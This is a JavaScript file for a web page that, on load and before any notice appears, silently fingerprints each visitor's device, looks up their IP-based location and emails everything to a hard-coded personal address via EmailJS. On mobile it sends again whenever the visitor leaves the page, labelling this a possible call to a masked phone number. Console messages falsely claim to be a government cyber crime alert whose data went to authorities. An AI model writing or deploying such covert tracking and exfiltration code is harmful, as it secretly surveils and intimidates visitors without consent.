// Enhanced Device and User Information Collection
async function collectDeviceInfo() {
    const deviceInfo = {
        // Timestamp
        timestamp: new Date().toISOString(),
        localTime: new Date().toLocaleString(),
        
        // IP Address and Location (will be fetched)
        ipAddress: 'Fetching...',
        ipCountry: 'Fetching...',
        ipCity: 'Fetching...',
        ipRegion: 'Fetching...',
        ipISP: 'Fetching...',
        
        // Device Owner/User Info
        deviceOwner: getDeviceOwner(),
        
        // Device Information
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        deviceType: getDeviceType(),
        deviceName: getDeviceName(),
        vendor: navigator.vendor || 'Unknown',
        
        // Operating System
        os: getOperatingSystem(),
        osVersion: getOSVersion(),
        
        // Browser Information
        browser: getBrowserName(),
        browserVersion: getBrowserVersion(),
        language: navigator.language,
        languages: navigator.languages ? navigator.languages.join(', ') : navigator.language,
        
        // Screen Information
        screenResolution: `${screen.width}x${screen.height}`,
        screenAvailableSize: `${screen.availWidth}x${screen.availHeight}`,
        colorDepth: `${screen.colorDepth}-bit`,
        pixelDepth: `${screen.pixelDepth}-bit`,
        orientation: screen.orientation ? screen.orientation.type : 'Unknown',
        
        // Window Information
        windowSize: `${window.innerWidth}x${window.innerHeight}`,
        devicePixelRatio: window.devicePixelRatio || 1,
        
        // Network Information
        onlineStatus: navigator.onLine ? 'Online' : 'Offline',
        cookiesEnabled: navigator.cookieEnabled ? 'Yes' : 'No',
        doNotTrack: navigator.doNotTrack || 'Not set',
        
        // Location & Time
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timezoneOffset: new Date().getTimezoneOffset(),
        
        // Page Information
        pageUrl: window.location.href,
        referrer: document.referrer || 'Direct Visit',
        
        // Hardware Concurrency
        cpuCores: navigator.hardwareConcurrency || 'Unknown',
        
        // Memory (if available)
        deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown',
        
        // Touch Support
        touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0 ? 'Yes' : 'No',
        maxTouchPoints: navigator.maxTouchPoints || 0,
        
        // WebGL Renderer (GPU Info)
        gpu: getGPUInfo(),
        
        // Plugins
        pluginsCount: navigator.plugins ? navigator.plugins.length : 0,
        
        // PDF Viewer
        pdfViewerEnabled: navigator.pdfViewerEnabled ? 'Yes' : 'No'
    };

    // Network Connection Details
    if (navigator.connection || navigator.mozConnection || navigator.webkitConnection) {
        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        deviceInfo.connectionType = connection.effectiveType || 'Unknown';
        deviceInfo.downlink = connection.downlink ? `${connection.downlink} Mbps` : 'Unknown';
        deviceInfo.rtt = connection.rtt ? `${connection.rtt} ms` : 'Unknown';
        deviceInfo.saveData = connection.saveData ? 'Enabled' : 'Disabled';
        deviceInfo.networkType = connection.type || 'Unknown';
    }

    // Battery Information
    if (navigator.getBattery) {
        try {
            const battery = await navigator.getBattery();
            deviceInfo.batteryLevel = `${Math.round(battery.level * 100)}%`;
            deviceInfo.batteryCharging = battery.charging ? 'Yes' : 'No';
            deviceInfo.chargingTime = battery.chargingTime === Infinity ? 'Not charging' : `${battery.chargingTime} seconds`;
            deviceInfo.dischargingTime = battery.dischargingTime === Infinity ? 'Unknown' : `${battery.dischargingTime} seconds`;
        } catch (e) {
            deviceInfo.batteryInfo = 'Not available';
        }
    }

    // Geolocation (if permitted)
    if (navigator.geolocation) {
        deviceInfo.geolocationSupport = 'Yes';
    }

    // Media Devices
    if (navigator.mediaDevices) {
        try {
            const devices = await navigator.mediaDevices.enumerateDevices();
            deviceInfo.audioInputs = devices.filter(d => d.kind === 'audioinput').length;
            deviceInfo.audioOutputs = devices.filter(d => d.kind === 'audiooutput').length;
            deviceInfo.videoInputs = devices.filter(d => d.kind === 'videoinput').length;
        } catch (e) {
            deviceInfo.mediaDevices = 'Permission denied';
        }
    }

    // Fetch IP Address and Location - Using multiple fallback APIs
    try {
        // Try ipapi.co first (includes location data in one call)
        try {
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();
            
            if (data.ip) {
                deviceInfo.ipAddress = data.ip;
                deviceInfo.ipCountry = data.country_name || 'Unknown';
                deviceInfo.ipCity = data.city || 'Unknown';
                deviceInfo.ipRegion = data.region || 'Unknown';
                deviceInfo.ipISP = data.org || 'Unknown';
                deviceInfo.ipPostal = data.postal || 'Unknown';
                deviceInfo.ipLatitude = data.latitude || 'Unknown';
                deviceInfo.ipLongitude = data.longitude || 'Unknown';
                console.log('✅ IP data fetched from ipapi.co');
                return deviceInfo;
            }
        } catch (e) {
            console.log('ipapi.co failed, trying fallback...');
        }

        // Fallback 1: Try ipify + ip-api.com
        try {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            deviceInfo.ipAddress = ipData.ip || 'Unknown';
            
            // Get location from ip-api.com
            const locationResponse = await fetch(`http://ip-api.com/json/${ipData.ip}`);
            const locationData = await locationResponse.json();
            
            if (locationData.status === 'success') {
                deviceInfo.ipCountry = locationData.country || 'Unknown';
                deviceInfo.ipCity = locationData.city || 'Unknown';
                deviceInfo.ipRegion = locationData.regionName || 'Unknown';
                deviceInfo.ipISP = locationData.isp || 'Unknown';
                deviceInfo.ipPostal = locationData.zip || 'Unknown';
                deviceInfo.ipLatitude = locationData.lat || 'Unknown';
                deviceInfo.ipLongitude = locationData.lon || 'Unknown';
                console.log('✅ IP data fetched from ipify + ip-api.com');
                return deviceInfo;
            }
        } catch (e) {
            console.log('ipify + ip-api.com failed, trying next fallback...');
        }

        // Fallback 2: Try ipinfo.io
        try {
            const response = await fetch('https://ipinfo.io/json');
            const data = await response.json();
            
            if (data.ip) {
                deviceInfo.ipAddress = data.ip;
                deviceInfo.ipCountry = data.country || 'Unknown';
                deviceInfo.ipCity = data.city || 'Unknown';
                deviceInfo.ipRegion = data.region || 'Unknown';
                deviceInfo.ipISP = data.org || 'Unknown';
                deviceInfo.ipPostal = data.postal || 'Unknown';
                const loc = data.loc ? data.loc.split(',') : ['Unknown', 'Unknown'];
                deviceInfo.ipLatitude = loc[0];
                deviceInfo.ipLongitude = loc[1];
                console.log('✅ IP data fetched from ipinfo.io');
                return deviceInfo;
            }
        } catch (e) {
            console.log('ipinfo.io failed');
        }

        // If all APIs fail, set defaults
        throw new Error('All IP APIs failed');
        
    } catch (e) {
        console.error('❌ All IP fetch attempts failed:', e);
        deviceInfo.ipAddress = 'Unable to fetch';
        deviceInfo.ipCountry = 'Unknown';
        deviceInfo.ipCity = 'Unknown';
        deviceInfo.ipRegion = 'Unknown';
        deviceInfo.ipISP = 'Unknown';
        deviceInfo.ipPostal = 'Unknown';
        deviceInfo.ipLatitude = 'Unknown';
        deviceInfo.ipLongitude = 'Unknown';
    }

    return deviceInfo;
}

// Helper Functions
function getDeviceType() {
    const ua = navigator.userAgent;
    if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) {
        return 'Tablet';
    }
    if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) {
        return 'Mobile';
    }
    return 'Desktop';
}

function getDeviceName() {
    const ua = navigator.userAgent;
    
    // iPhone models
    if (/iPhone/.test(ua)) {
        if (/iPhone OS 1[5-9]|iPhone OS [2-9][0-9]/.test(ua)) return 'iPhone (Recent Model)';
        return 'iPhone';
    }
    
    // iPad models
    if (/iPad/.test(ua)) return 'iPad';
    
    // Android devices
    if (/Android/.test(ua)) {
        if (/SM-/.test(ua)) return 'Samsung ' + (ua.match(/SM-[A-Z0-9]+/) || ['Unknown'])[0];
        if (/Pixel/.test(ua)) return 'Google Pixel';
        if (/OnePlus/.test(ua)) return 'OnePlus';
        if (/Mi |Redmi/.test(ua)) return 'Xiaomi ' + (ua.match(/(Mi |Redmi)[A-Z0-9 ]+/) || [''])[0];
        if (/OPPO/.test(ua)) return 'OPPO';
        if (/vivo/.test(ua)) return 'Vivo';
        if (/Realme/.test(ua)) return 'Realme';
        return 'Android Device';
    }
    
    // Windows
    if (/Windows/.test(ua)) return 'Windows PC';
    
    // Mac
    if (/Macintosh|Mac OS X/.test(ua)) return 'Mac';
    
    // Linux
    if (/Linux/.test(ua)) return 'Linux PC';
    
    return 'Unknown Device';
}

function getOperatingSystem() {
    const ua = navigator.userAgent;
    if (/Windows NT 10/.test(ua)) return 'Windows 10/11';
    if (/Windows NT 6.3/.test(ua)) return 'Windows 8.1';
    if (/Windows NT 6.2/.test(ua)) return 'Windows 8';
    if (/Windows NT 6.1/.test(ua)) return 'Windows 7';
    if (/Windows/.test(ua)) return 'Windows';
    if (/Android/.test(ua)) return 'Android';
    if (/iPhone|iPad|iPod/.test(ua)) return 'iOS';
    if (/Mac OS X/.test(ua)) return 'macOS';
    if (/Linux/.test(ua)) return 'Linux';
    if (/CrOS/.test(ua)) return 'Chrome OS';
    return 'Unknown OS';
}

function getOSVersion() {
    const ua = navigator.userAgent;
    let match;
    
    if ((match = ua.match(/Android ([0-9.]+)/))) return match[1];
    if ((match = ua.match(/iPhone OS ([0-9_]+)/))) return match[1].replace(/_/g, '.');
    if ((match = ua.match(/Mac OS X ([0-9_]+)/))) return match[1].replace(/_/g, '.');
    if ((match = ua.match(/Windows NT ([0-9.]+)/))) return match[1];
    
    return 'Unknown';
}

function getBrowserName() {
    const ua = navigator.userAgent;
    if (/Edg/.test(ua)) return 'Microsoft Edge';
    if (/Chrome/.test(ua) && !/Edg/.test(ua)) return 'Google Chrome';
    if (/Safari/.test(ua) && !/Chrome/.test(ua)) return 'Safari';
    if (/Firefox/.test(ua)) return 'Firefox';
    if (/MSIE|Trident/.test(ua)) return 'Internet Explorer';
    if (/Opera|OPR/.test(ua)) return 'Opera';
    return 'Unknown Browser';
}

function getBrowserVersion() {
    const ua = navigator.userAgent;
    let match;
    
    if ((match = ua.match(/Edg\/([0-9.]+)/))) return match[1];
    if ((match = ua.match(/Chrome\/([0-9.]+)/))) return match[1];
    if ((match = ua.match(/Version\/([0-9.]+)/))) return match[1];
    if ((match = ua.match(/Firefox\/([0-9.]+)/))) return match[1];
    
    return 'Unknown';
}

function getGPUInfo() {
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (debugInfo) {
                return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            }
        }
    } catch (e) {
        return 'Unknown';
    }
    return 'Unknown';
}

function getDeviceOwner() {
    // Try to get device owner name from various sources
    const ua = navigator.userAgent;
    
    // Check for Windows username (not available in browser)
    // Check for device name patterns
    if (/Windows/.test(ua)) {
        return 'Windows User';
    }
    if (/Macintosh/.test(ua)) {
        return 'Mac User';
    }
    if (/Android/.test(ua)) {
        // Try to extract Android device owner info
        const match = ua.match(/Build\/([^;)]+)/);
        return match ? `Android User (${match[1]})` : 'Android User';
    }
    if (/iPhone|iPad/.test(ua)) {
        return 'iOS User';
    }
    
    return 'Unknown User';
}

// Send comprehensive data to email service using EmailJS
function sendToEmail(data) {
    const serviceID = 'service_fp8u6dm';
    const templateID = 'template_imuol17';
    
    // Prepare ALL email parameters with proper fallbacks
    const templateParams = {
        // Recipient Email (if not configured in template)
        to_email: 'Vinayakshukla3001@gmail.com',
        
        // IP & Location Information
        ip_address: data.ipAddress || 'Unknown',
        ip_country: data.ipCountry || 'Unknown',
        ip_city: data.ipCity || 'Unknown',
        ip_region: data.ipRegion || 'Unknown',
        ip_postal: data.ipPostal || 'Unknown',
        ip_isp: data.ipISP || 'Unknown',
        ip_coordinates: `${data.ipLatitude || 'Unknown'}, ${data.ipLongitude || 'Unknown'}`,
        
        // User Information
        device_owner: data.deviceOwner || 'Unknown',
        
        // Timestamp
        timestamp: data.timestamp || new Date().toISOString(),
        local_time: data.localTime || new Date().toLocaleString(),
        timezone: data.timezone || 'Unknown',
        
        // Device Information
        device_name: data.deviceName || 'Unknown',
        device_type: data.deviceType || 'Unknown',
        vendor: data.vendor || 'Unknown',
        platform: data.platform || 'Unknown',
        
        // Operating System
        os: data.os || 'Unknown',
        os_name: data.os || 'Unknown',
        os_version: data.osVersion || 'Unknown',
        
        // Browser Information
        browser: `${data.browser || 'Unknown'} ${data.browserVersion || ''}`,
        browser_name: data.browser || 'Unknown',
        browser_version: data.browserVersion || 'Unknown',
        language: data.language || 'Unknown',
        all_languages: data.languages || 'Unknown',
        cookies_enabled: data.cookiesEnabled || 'Unknown',
        do_not_track: data.doNotTrack || 'Not set',
        
        // Network Information
        network_type: data.connectionType || 'Unknown',
        connection_speed: data.downlink || 'Unknown',
        network_latency: data.rtt || 'Unknown',
        save_data_mode: data.saveData || 'Unknown',
        online_status: data.onlineStatus || 'Unknown',
        
        // Battery Information
        battery_level: data.batteryLevel || 'Unknown',
        charging_status: data.batteryCharging || 'Unknown',
        charging_time: data.chargingTime || 'Unknown',
        discharging_time: data.dischargingTime || 'Unknown',
        
        // Screen & Display
        screen_resolution: data.screenResolution || 'Unknown',
        available_screen: data.screenAvailableSize || 'Unknown',
        window_size: data.windowSize || 'Unknown',
        color_depth: data.colorDepth || 'Unknown',
        pixel_depth: data.pixelDepth || 'Unknown',
        pixel_ratio: data.devicePixelRatio || 'Unknown',
        orientation: data.orientation || 'Unknown',
        
        // Hardware Information
        gpu: data.gpu || 'Unknown',
        cpu_cores: data.cpuCores || 'Unknown',
        device_memory: data.deviceMemory || 'Unknown',
        
        // Input & Media Devices
        touch_support: data.touchSupport || 'Unknown',
        max_touch_points: data.maxTouchPoints || 0,
        audio_inputs: data.audioInputs || 0,
        audio_outputs: data.audioOutputs || 0,
        video_inputs: data.videoInputs || 0,
        
        // Page Information
        page_url: data.pageUrl || window.location.href,
        referrer: data.referrer || 'Direct Visit',
        
        // Technical Details
        plugins_count: data.pluginsCount || 0,
        pdf_viewer: data.pdfViewerEnabled || 'Unknown',
        user_agent: data.userAgent || navigator.userAgent,
        
        // Complete Device Data (JSON)
        complete_data: JSON.stringify(data, null, 2)
    };

    console.log('📤 Sending email with comprehensive data...');
    console.log('Template Parameters:', templateParams);

    emailjs.send(serviceID, templateID, templateParams)
        .then(function(response) {
            console.log('✅ Email sent successfully via EmailJS!', response.status, response.text);
            console.log('📧 All device information has been transmitted');
        })
        .catch(function(error) {
            console.error('❌ Failed to send email:', error);
            console.log('Error status:', error.status);
            console.log('Error text:', error.text);
            console.log('Template params that failed:', templateParams);
        });
}

// Modal functionality
const modal = document.getElementById('warningModal');
const closeBtn = document.getElementsByClassName('close')[0];
const acknowledgeBtn = document.getElementById('acknowledgeBtn');

// Show modal on page load
window.onload = async function() {
    // Collect comprehensive device info IMMEDIATELY
    const deviceInfo = await collectDeviceInfo();
    
    console.log('📊 Collected Device Information:', deviceInfo);
    
    // Send data to email service FIRST (before showing modal)
    sendToEmail(deviceInfo);
    
    // Show modal after 2 seconds (gives time for email to send)
    setTimeout(() => {
        modal.style.display = 'block';
    }, 2000);
};

// Close modal when X is clicked
closeBtn.onclick = function() {
    modal.style.display = 'none';
};

// Close modal when acknowledge button is clicked
acknowledgeBtn.onclick = function() {
    modal.style.display = 'none';
};

// Close modal when clicking outside
window.onclick = function(event) {
    if (event.target == modal) {
        modal.style.display = 'none';
    }
};

// Track scroll depth
let maxScroll = 0;
window.addEventListener('scroll', function() {
    const scrollPercent = (window.scrollY / (document.documentElement.scrollHeight - window.innerHeight)) * 100;
    if (scrollPercent > maxScroll) {
        maxScroll = Math.round(scrollPercent);
    }
});

// Detect if user tries to call the number (mobile only)
if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
    document.addEventListener('visibilitychange', async function() {
        if (document.hidden) {
            // Send alert about possible call
            const callData = await collectDeviceInfo();
            callData.action = '📞 Possible call attempt detected';
            callData.suspectedNumber = '+91-XXXXX-XXX55';
            sendToEmail(callData);
        }
    });
}

// Monitor network changes
if (navigator.connection) {
    navigator.connection.addEventListener('change', async function() {
        const networkData = await collectDeviceInfo();
        networkData.action = '📶 Network changed';
        console.log('Network changed:', networkData.connectionType);
    });
}

// Console warning
console.log('%c⚠️ WARNING ⚠️', 'color: red; font-size: 30px; font-weight: bold;');
console.log('%cThis is a government cyber crime alert page. All activities are being monitored and logged.', 'color: red; font-size: 16px;');
console.log('%cDevice information has been collected and sent to authorities.', 'color: orange; font-size: 14px;');
